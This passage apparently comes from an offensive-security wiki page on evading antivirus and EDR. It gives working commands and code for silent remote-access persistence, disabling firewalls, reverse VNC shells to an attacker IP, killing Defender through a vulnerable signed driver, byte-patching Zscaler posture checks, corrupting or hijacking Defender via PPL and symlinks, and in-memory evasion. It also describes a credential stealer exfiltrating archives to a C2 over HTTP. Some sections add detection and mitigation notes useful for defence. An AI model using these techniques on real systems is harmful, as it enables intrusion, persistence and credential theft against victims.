  \ the execution of your payload, there's a **much greater chance** of **losing your beacon** as it could crash.\n\n<figure><img\
  \ src=\"../images/image (1136).png\" alt=\"\"><figcaption></figcaption></figure>\n\n> [!TIP]\n> If you want to read more\
  \ about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)\
  \ and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))\n\
  \nYou can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)\
  \ and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).\n\n## Using Other Programming Languages\n\n\
  As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), it's possible to\
  \ execute malicious code using other languages by giving the compromised machine access **to the interpreter environment\
  \ installed on the Attacker Controlled SMB share**.\n\nBy allowing access to the Interpreter Binaries and the environment\
  \ on the SMB share you can **execute arbitrary code in these languages within memory** of the compromised machine.\n\nThe\
  \ repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass\
  \ static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.\n\
  \n## TokenStomping\n\nToken stomping is a technique that allows an attacker to **manipulate the access token or a security\
  \ prouct like an EDR or AV**, allowing them to reduce it privileges so the process won't die but it won't have permissions\
  \ to check for malicious activities.\n\nTo prevent this Windows could **prevent external processes** from getting handles\
  \ over the tokens of security processes.\n\n- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)\n\

  \n## Using Trusted Software\n\n### Chrome Remote Desktop\n\nAs described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide),\
  \ it's easy to just deploy the Chrome Remote Desktop in a victims PC and then use it to takeover it and maintain persistence:\n\
  1. Download from https://remotedesktop.google.com/, click on \"Set up via SSH\", and then click on the MSI file for Windows\
  \ to download the MSI file.\n2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi\
  \ /qn`\n3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the\
  \ Authorize button to continue.\n4. Execute the given parameter with some adjustments: `\"%PROGRAMFILES(X86)%\\Google\\\
  Chrome Remote Desktop\\CurrentVersion\\remoting_start_host.exe\" --code=\"YOUR_UNIQUE_CODE\" --redirect-url=\"https://remotedesktop.google.com/_/oauthredirect\"\
  \ --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).\n \n\n## Advanced\
  \ Evasion\n\nEvasion is a very complicated topic, sometimes you have to take into account many different sources of telemetry\
  \ in just one system, so it's pretty much impossible to stay completely undetected in mature environments.\n\nEvery environment\
  \ you go against will have their own strengths and weaknesses.\n\nI highly encourage you go watch this talk from [@ATTL4S](https://twitter.com/DaniLJ94),\
  \ to get a foothold into more Advanced Evasion techniques.\n\n\n{{#ref}}\nhttps://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo\n\
  {{#endref}}\n\nhis is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.\n\
  \n\n{{#ref}}\nhttps://www.youtube.com/watch?v=IbA7Ung39o4\n{{#endref}}\n\n## **Old Techniques**\n\n### **Check which parts\
  \ Defender finds as malicious**\n\nYou can use [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) which will\
  \ **remove parts of the binary** until it **finds out which part Defender** is finding as malicious and split it to you.\\\
  \nAnother tool doing the **same thing is** [**avred**](https://github.com/dobin/avred) with an open web offering the service\
  \ in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)\n\n### **Telnet Server**\n\nUntil Windows10, all Windows came\
  \ with a **Telnet server** that you could install (as administrator) doing:\n\n```bash\npkgmgr /iu:\"TelnetServer\" /quiet\n\
  ```\n\nMake it **start** when the system is started and **run** it now:\n\n```bash\nsc config TlntSVR start= auto obj= localsystem\n\
  ```\n\n**Change telnet port** (stealth) and disable firewall:\n\n```\ntlntadmn config port=80\nnetsh advfirewall set allprofiles\
  \ state off\n```\n\n### UltraVNC\n\nDownload it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)\
  \ (you want the bin downloads, not the setup)\n\n**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:\n\n\
  - Enable the option _Disable TrayIcon_\n- Set a password in _VNC Password_\n- Set a password in _View-Only Password_\n\n\
  Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.ini**_ inside the **victim**\n\n#### **Reverse\
  \ connection**\n\nThe **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it\
  \ will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe\
  \ -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`\n\n**WARNING:** To maintain stealth you must\
  \ not do a few things\n\n- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png).\
  \ check if it's running with `tasklist | findstr winvnc`\n- Don't start `winvnc` without `UltraVNC.ini` in the same directory\
  \ or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open\n- Don't run `winvnc -h` for help or you'll\
  \ trigger a [popup](https://i.imgur.com/oc18wcu.png)\n\n### GreatSCT\n\nDownload it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)\n\
  \n```\ngit clone https://github.com/GreatSCT/GreatSCT.git\ncd GreatSCT/setup/\n./setup.sh\ncd ..\n./GreatSCT.py\n```\n\n\
  Inside GreatSCT:\n\n```\nuse 1\nlist #Listing available payloads\nuse 9 #rev_tcp.py\nset lhost 10.10.14.0\nsel lport 4444\n\

  \n## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space\n\nStorm-2603 leveraged a tiny console\
  \ utility known as **Antivirus Terminator** to disable endpoint protections before dropping ransomware. The tool brings\
  \ its **own vulnerable but *signed* driver** and abuses it to issue privileged kernel operations that even Protected-Process-Light\
  \ (PPL) AV services cannot block.\n\nKey take-aways\n1. **Signed driver**: The file delivered to disk is `ServiceMouse.sys`,\
  \ but the binary is the legitimately signed driver `AToolsKrnl64.sys` from Antiy Labs’ “System In-Depth Analysis Toolkit”.\
  \ Because the driver bears a valid Microsoft signature it loads even when Driver-Signature-Enforcement (DSE) is enabled.\n\
  2. **Service installation**:\n   ```powershell\n   sc create ServiceMouse type= kernel binPath= \"C:\\Windows\\System32\\\
  drivers\\ServiceMouse.sys\"\n   sc start  ServiceMouse\n   ```\n   The first line registers the driver as a **kernel service**\
  \ and the second one starts it so that `\\\\.\\ServiceMouse` becomes accessible from user land.\n3. **IOCTLs exposed by\
  \ the driver**\n   | IOCTL code | Capability                              |\n   |-----------:|-----------------------------------------|\n\
  \   | `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |\n   | `0x990000D0` | Delete\
  \ an arbitrary file on disk |\n   | `0x990001D0` | Unload the driver and remove the service |\n\n   Minimal C proof-of-concept:\n\
  \   ```c\n   #include <windows.h>\n   \n   int main(int argc, char **argv){\n       DWORD pid = strtoul(argv[1], NULL, 10);\n\
  \       HANDLE hDrv = CreateFileA(\"\\\\\\\\.\\\\ServiceMouse\", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0,\
  \ NULL);\n       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);\n       CloseHandle(hDrv);\n\
  \       return 0;\n   }\n   ```\n4. **Why it works**:  BYOVD skips user-mode protections entirely; code that executes in\
  \ the kernel can open *protected* processes, terminate them, or tamper with kernel objects irrespective of PPL/PP, ELAM\
  \ or other hardening features.\n\nDetection / Mitigation\n•  Enable Microsoft’s vulnerable-driver block list (`HVCI`, `Smart\
  \ App Control`) so Windows refuses to load `AToolsKrnl64.sys`.\n•  Monitor creations of new *kernel* services and alert\
  \ when a driver is loaded from a world-writable directory or not present on the allow-list.\n•  Watch for user-mode handles\
  \ to custom device objects followed by suspicious `DeviceIoControl` calls.\n\n### Bypassing Zscaler Client Connector Posture\
  \ Checks via On-Disk Binary Patching\n\nZscaler’s **Client Connector** applies device-posture rules locally and relies on\
  \ Windows RPC to communicate the results to other components. Two weak design choices make a full bypass possible:\n\n1.\
  \ Posture evaluation happens **entirely client-side** (a boolean is sent to the server).\n2. Internal RPC endpoints only\
  \ validate that the connecting executable is **signed by Zscaler** (via `WinVerifyTrust`).\n\nBy **patching four signed\
  \ binaries on disk** both mechanisms can be neutralised:\n\n| Binary | Original logic patched | Result |\n|--------|------------------------|---------|\n\
  | `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Always returns `1` so every check is compliant |\n| `ZSAService.exe`\
  \ | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |\n| `ZSATrayHelper.dll`\
  \ | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |\n| `ZSATunnel.exe` | Integrity checks on the tunnel\
  \ | Short-circuited |\n\nMinimal patcher excerpt:\n\n```python\npattern = bytes.fromhex(\"44 89 AC 24 80 02 00 00\")\nreplacement\
  \ = bytes.fromhex(\"C6 84 24 80 02 00 00 01\")  # force result = 1\n\nwith open(\"ZSATrayManager.exe\", \"r+b\") as f:\n\
  \    data = f.read()\n    off = data.find(pattern)\n    if off == -1:\n        print(\"pattern not found\")\n    else:\n\
  \        f.seek(off)\n        f.write(replacement)\n```\n\nAfter replacing the original files and restarting the service\
  \ stack:\n\n* **All** posture checks display **green/compliant**.\n* Unsigned or modified binaries can open the named-pipe\
  \ RPC endpoints (e.g. `\\\\RPC Control\\\\ZSATrayManager_talk_to_me`).\n* The compromised host gains unrestricted access\
  \ to the internal network defined by the Zscaler policies.\n\nThis case study demonstrates how purely client-side trust\
  \ decisions and simple signature checks can be defeated with a few byte patches.\n\n## Abusing Protected Process Light (PPL)\
  \ To Tamper AV/EDR With LOLBINs\n\nProtected Process Light (PPL) enforces a signer/level hierarchy so that only equal-or-higher\
  \ protected processes can tamper with each other. Offensively, if you can legitimately launch a PPL-enabled binary and control\
  \ its arguments, you can convert benign functionality (e.g., logging) into a constrained, PPL-backed write primitive against\
  \ protected directories used by AV/EDR.\n\nWhat makes a process run as PPL\n- The target EXE (and any loaded DLLs) must\
  \ be signed with a PPL-capable EKU.\n- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT\
  \ | CREATE_PROTECTED_PROCESS`.\n- A compatible protection level must be requested that matches the signer of the binary\
  \ (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers).\
  \ Wrong levels will fail at creation.\n\nSee also a broader intro to PP/PPL and LSASS protection here:\n\n{{#ref}}\nstealing-credentials/credentials-protections.md\n\
  {{#endref}}\n\nLauncher tooling\n- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments\
  \ to the target EXE):\n  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)\n\
  - Usage pattern:\n\n```text\nCreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]\n# example: spawn a\
  \ Windows-signed component at PPL level 1 (Windows)\nCreateProcessAsPPL.exe 1 C:\\Windows\\System32\\ClipUp.exe <args>\n\
  # example: spawn an anti-malware signed component at level 3\nCreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>\n\
  ```\n\nLOLBIN primitive: ClipUp.exe\n- The signed system binary `C:\\Windows\\System32\\ClipUp.exe` self-spawns and accepts\
  \ a parameter to write a log file to a caller-specified path.\n- When launched as a PPL process, the file write occurs with\
  \ PPL backing.\n- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.\n\
  \n8.3 short path helpers\n- List short names: `dir /x` in each parent directory.\n- Derive short path in cmd: `for %A in\
  \ (\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\") do @echo %~sA`\n\nAbuse chain (abstract)\n1) Launch the PPL-capable\
  \ LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).\n2) Pass the ClipUp log-path\
  \ argument to force a file creation in a protected AV directory (e.g., Defender Platform). Use 8.3 short names if needed.\n\
  3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot\
  \ before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process\
  \ Monitor (boot logging).\n4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target\
  \ file and preventing startup.\n\nExample invocation (paths redacted/shortened for safety):\n\n```text\n# Run ClipUp as\
  \ PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names\nCreateProcessAsPPL.exe 1 C:\\\
  Windows\\System32\\ClipUp.exe -ppl C:\\PROGRA~3\\MICROS~1\\WINDOW~1\\Platform\\<ver>\\samplew.dll\n```\n\nNotes and constraints\n\
  - You cannot control the contents ClipUp writes beyond placement; the primitive is suited to corruption rather than precise\
  \ content injection.\n- Requires local admin/SYSTEM to install/start a service and a reboot window.\n- Timing is critical:\
  \ the target must not be open; boot-time execution avoids file locks.\n\nDetections\n- Process creation of `ClipUp.exe`\
  \ with unusual arguments, especially parented by non-standard launchers, around boot.\n- New services configured to auto-start\
  \ suspicious binaries and consistently starting before Defender/AV. Investigate service creation/modification prior to Defender\
  \ startup failures.\n- File integrity monitoring on Defender binaries/Platform directories; unexpected file creations/modifications\
  \ by processes with protected-process flags.\n- ETW/EDR telemetry: look for processes created with `CREATE_PROTECTED_PROCESS`\
  \ and anomalous PPL level usage by non-AV binaries.\n\nMitigations\n- WDAC/Code Integrity: restrict which signed binaries\
  \ may run as PPL and under which parents; block ClipUp invocation outside legitimate contexts.\n- Service hygiene: restrict\
  \ creation/modification of auto-start services and monitor start-order manipulation.\n- Ensure Defender tamper protection\
  \ and early-launch protections are enabled; investigate startup errors indicating binary corruption.\n- Consider disabling\
  \ 8.3 short-name generation on volumes hosting security tooling if compatible with your environment (test thoroughly).\n\

  \n## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack\n\nWindows Defender chooses the platform it\
  \ runs from by enumerating subfolders under:\n- `C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\`\n\nIt selects\
  \ the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service\
  \ processes from there (updating service/registry paths accordingly). This selection trusts directory entries including\
  \ directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path\
  \ and achieve DLL sideloading or service disruption.\n\nPreconditions\n- Local Administrator (needed to create directories/symlinks\
  \ under the Platform folder)\n- Ability to reboot or trigger Defender platform re-selection (service restart on boot)\n\
  - Only built-in tools required (mklink)\n\nWhy it works\n- Defender blocks writes in its own folders, but its platform selection\
  \ trusts directory entries and picks the lexicographically highest version without validating that the target resolves to\
  \ a protected/trusted path.\n\nStep-by-step (example)\n1) Prepare a writable clone of the current platform folder, e.g.\
  \ `C:\\TMP\\AV`:\n```cmd\nset SRC=\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25070.5-0\"\nset DST=\"\
  C:\\TMP\\AV\"\nrobocopy %SRC% %DST% /MIR\n```\n2) Create a higher-version directory symlink inside Platform pointing to\
  \ your folder:\n```cmd\nmklink /D \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\5.18.25070.5-0\" \"C:\\TMP\\\
  AV\"\n```\n3) Trigger selection (reboot recommended):\n```cmd\nshutdown /r /t 0\n```\n4) Verify MsMpEng.exe (WinDefend)\
  \ runs from the redirected path:\n```powershell\nGet-Process MsMpEng | Select-Object Id,Path\n# or\nwmic process where name='MsMpEng.exe'\
  \ get ProcessId,ExecutablePath\n```\nYou should observe the new process path under `C:\\TMP\\AV\\` and the service configuration/registry\
  \ reflecting that location.\n\nPost-exploitation options\n- DLL sideloading/code execution: Drop/replace DLLs that Defender\
  \ loads from its application directory to execute code in Defender’s processes. See the section above: [DLL Sideloading\
  \ & Proxying](#dll-sideloading--proxying).\n- Service kill/denial: Remove the version-symlink so on next start the configured\
  \ path doesn’t resolve and Defender fails to start:\n```cmd\nrmdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\\
  5.18.25070.5-0\"\n```\n\n> [!TIP]\n> Note that This technique does not provide privilege escalation by itself; it requires\
  \ admin rights.\n\n## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)\n\nRed teams can move runtime evasion\
  \ out of the C2 implant and into the target module itself by hooking its Import Address Table (IAT) and routing selected\
  \ APIs through attacker-controlled, position‑independent code (PIC). This generalises evasion beyond the small API surface\
  \ many kits expose (e.g., CreateProcessA), and extends the same protections to BOFs and post‑exploitation DLLs.\n\nHigh-level\
  \ approach\n- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must\
  \ be self‑contained and position‑independent.\n- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT\
  \ entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC\
  \ wrappers.\n- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:\n\
  \  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore\
  \ post‑call.\n  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis\
  \ resolves to expected frames.\n- For compatibility, export an interface so an Aggressor script (or equivalent) can register\
  \ which APIs to hook for Beacon, BOFs and post‑ex DLLs.\n\nWhy IAT hooking here\n- Works for any code that uses the hooked\
  \ import, without modifying tool code or relying on Beacon to proxy specific APIs.\n- Covers post‑ex DLLs: hooking LoadLibrary*\
  \ lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion\
  \ to their API calls.\n- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections\
  \ by wrapping CreateProcessA/W.\n\nMinimal IAT hook sketch (x64 C/C++ pseudocode)\n```c\n// For each IMAGE_IMPORT_DESCRIPTOR\n\
  //  For each thunk in the IAT\n//    if imported function == \"CreateProcessA\"\n//       WriteProcessMemory(local): IAT[idx]\
  \ = (ULONG_PTR)Pic_CreateProcessA_Wrapper;\n// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...);\
  \ unmask();\n```\nNotes\n- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders\
  \ like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.\n- Keep wrappers tiny and PIC-safe; resolve\
  \ the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.\n- Use RW → RX transitions\
  \ for PIC and avoid leaving writable+executable pages.\n\nCall‑stack spoofing stub\n- Draugr‑style PIC stubs build a fake\
  \ call chain (return addresses into benign modules) and then pivot into the real API.\n- This defeats detections that expect\
  \ canonical stacks from Beacon/BOFs to sensitive APIs.\n- Pair with stack cutting/stack stitching techniques to land inside\
  \ expected frames before the API prologue.\n\nOperational integration\n- Prepend the reflective loader to post‑ex DLLs so\
  \ the PIC and hooks initialise automatically when the DLL is loaded.\n- Use an Aggressor script to register target APIs\
  \ so Beacon and BOFs transparently benefit from the same evasion path without code changes.\n\nDetection/DFIR considerations\n\
  - IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.\n- Stack\
  \ anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart\
  \ ancestry.\n- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected\
  \ RX regions created at load.\n- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr\
  \ assemblies correlated with memory masking events.\n\nRelated building blocks and examples\n- Reflective loaders that perform\
  \ IAT patching during load (e.g., TitanLdr, AceLdr)\n- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)\n\
  - PIC call‑stack spoofing stubs (e.g., Draugr)\n\n\n## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)\n\
  \n### Import-time IAT hooks via a resident PICO\n\nIf you control a reflective loader, you can hook imports **during** `ProcessImports()`\
  \ by replacing the loader's `GetProcAddress` pointer with a custom resolver that checks hooks first:\n\n- Build a **resident\
  \ PICO** (persistent PIC object) that survives after the transient loader PIC frees itself.\n- Export a `setup_hooks()`\
  \ function that overwrites the loader's import resolver (e.g., `funcs.GetProcAddress = _GetProcAddress`).\n- In `_GetProcAddress`,\
  \ skip ordinal imports and use a hash-based hook lookup like `__resolve_hook(ror13hash(name))`. If a hook exists, return\
  \ it; otherwise delegate to the real `GetProcAddress`.\n- Register hook targets at link time with Crystal Palace `addhook\
  \ \"MODULE$Func\" \"hook\"` entries. The hook stays valid because it lives inside the resident PICO.\n\nThis yields **import-time\
  \ IAT redirection** without patching the loaded DLL's code section post-load.\n\n### Forcing hookable imports when the target\
  \ uses PEB-walking\n\nImport-time hooks only trigger if the function is actually in the target's IAT. If a module resolves\
  \ APIs via a PEB-walk + hash (no import entry), force a real import so the loader's `ProcessImports()` path sees it:\n\n\
  - Replace hashed export resolution (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) with a direct reference\
  \ like `&WaitForSingleObject`.\n- The compiler emits an IAT entry, enabling interception when the reflective loader resolves\
  \ imports.\n\n### Ekko-style sleep/idle obfuscation without patching `Sleep()`\n\nInstead of patching `Sleep`, hook the\
  \ **actual wait/IPC primitives** the implant uses (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`).\
  \ For long waits, wrap the call in an Ekko-style obfuscation chain that encrypts the in-memory image during idle:\n\n- Use\
  \ `CreateTimerQueueTimer` to schedule a sequence of callbacks that call `NtContinue` with crafted `CONTEXT` frames.\n- Typical\
  \ chain (x64): set image to `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` over the full mapped image →\
  \ perform the blocking wait → RC4 decrypt → **restore per-section permissions** by walking PE sections → signal completion.\n\
  - `RtlCaptureContext` provides a template `CONTEXT`; clone it into multiple frames and set registers (`Rip/Rcx/Rdx/R8/R9`)\
  \ to invoke each step.\n\nOperational detail: return “success” for long waits (e.g., `WAIT_OBJECT_0`) so the caller continues\
  \ while the image is masked. This pattern hides the module from scanners during idle windows and avoids the classic “patched\
  \ `Sleep()`” signature.\n\nDetection ideas (telemetry-based)\n- Bursts of `CreateTimerQueueTimer` callbacks pointing to\
  \ `NtContinue`.\n- `advapi32!SystemFunction032` used on large contiguous image-sized buffers.\n- Large-range `VirtualProtect`\
  \ followed by custom per-section permission restoration.\n\n\n## SantaStealer Tradecraft for Fileless Evasion and Credential\
  \ Theft\n\nSantaStealer (aka BluelineStealer) illustrates how modern info-stealers blend AV bypass, anti-analysis and credential\
  \ access in a single workflow.\n\n### Keyboard layout gating & sandbox delay\n\n- A config flag (`anti_cis`) enumerates\
  \ installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS`\
  \ marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting\
  \ artifact.\n\n```c\nHKL layouts[64];\nint count = GetKeyboardLayoutList(64, layouts);\nfor (int i = 0; i < count; i++)\
  \ {\n    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));\n    if (lang == LANG_RUSSIAN) {\n        CreateFileA(\"\
  CIS\", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);\n        ExitProcess(0);\n    }\n}\nSleep(exec_delay_seconds * 1000);\
  \ // config-controlled delay to outlive sandboxes\n```\n\n### Layered `check_antivm` logic\n\n- Variant A walks the process\
  \ list, hashes each name with a custom rolling checksum, and compares it against embedded blocklists for debuggers/sandboxes;\
  \ it repeats the checksum over the computer name and checks working directories such as `C:\\analysis`.\n- Variant B inspects\
  \ system properties (process-count floor, recent uptime), calls `OpenServiceA(\"VBoxGuest\")` to detect VirtualBox additions,\
  \ and performs timing checks around sleeps to spot single-stepping. Any hit aborts before modules launch.\n\n### Fileless\
  \ helper + double ChaCha20 reflective loading\n\n- The primary DLL/EXE embeds a Chromium credential helper that is either\
  \ dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself so no helper artifacts\
  \ are written.\n- That helper stores a second-stage DLL encrypted twice with ChaCha20 (two 32-byte keys + 12-byte nonces).\
  \ After both passes, it reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`\
  \ derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).\n- The ChromElevator routines\
  \ use direct-syscall reflective process hollowing to inject into a live Chromium browser, inherit AppBound Encryption keys,\
  \ and decrypt passwords/cookies/credit cards straight from SQLite databases despite ABE hardening.\n\n\n### Modular in-memory\
  \ collection & chunked HTTP exfil\n\n- `create_memory_based_log` iterates a global `memory_generators` function-pointer\
  \ table and spawns one thread per enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions,\
  \ etc.). Each thread writes results into shared buffers and reports its file count after a ~45s join window.\n- Once finished,\
  \ everything is zipped with the statically linked `miniz` library as `%TEMP%\\\\Log.zip`. `ThreadPayload1` then sleeps 15s\
  \ and streams the archive in 10 MB chunks via HTTP POST to `http://<C2>:6767/upload`, spoofing a browser `multipart/form-data`\
  \ boundary (`----WebKitFormBoundary***`). Each chunk adds `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`,\
  \ and the last chunk appends `complete: true` so the C2 knows reassembly is done.\n\n## References\n\n- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)\n\
